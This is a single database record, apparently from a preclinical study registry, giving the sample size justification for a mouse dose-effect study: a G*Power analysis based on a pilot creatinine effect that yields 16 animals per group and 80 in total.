	(7089,176,'sample_size_calculation_details','\"A priori sample size calculation (alpha&lt;5%, power&gt;90%, tool: GPower 3.1) for a random-effect (dose effect) ANOVA model revealed out 8 animals per dose group. The statistical power analysis was based on an estimated effect (plasma Creatinine 40%, f2=0.65) of our pilot study. Taking into account a representative sample of female and male animals from two different wild type mouse strains each, and an equal distribution to the two study sites an experimental group size of 16 animals (total N=80) is required. No drop outs is respected.\"','2022-03-31 13:23:48','2022-03-31 13:23:48'),
